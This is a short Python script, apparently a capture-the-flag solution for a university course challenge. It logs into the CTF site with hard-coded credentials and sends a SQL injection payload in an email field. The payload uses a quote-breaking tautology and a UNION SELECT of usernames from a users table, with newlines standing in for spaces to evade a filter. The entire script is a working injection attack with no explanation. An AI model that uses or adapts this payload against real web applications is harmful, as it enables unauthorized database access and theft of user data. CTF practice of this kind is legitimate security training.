import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/8c2dd7e9818e5c6a9f8562feefa002dc0e455f0e92c8a46ab0cf519b1547eced"

postData = {"subEmail":"\'or\'1\'=\'1\'union\nselect\nuserName\nfrom\nusers\nwhere\'\'!=\'@v",
            "subPassword":"asdfqwerzxcv"}

response2 = session.post(targetUrl, data=postData)
print(response2.text)
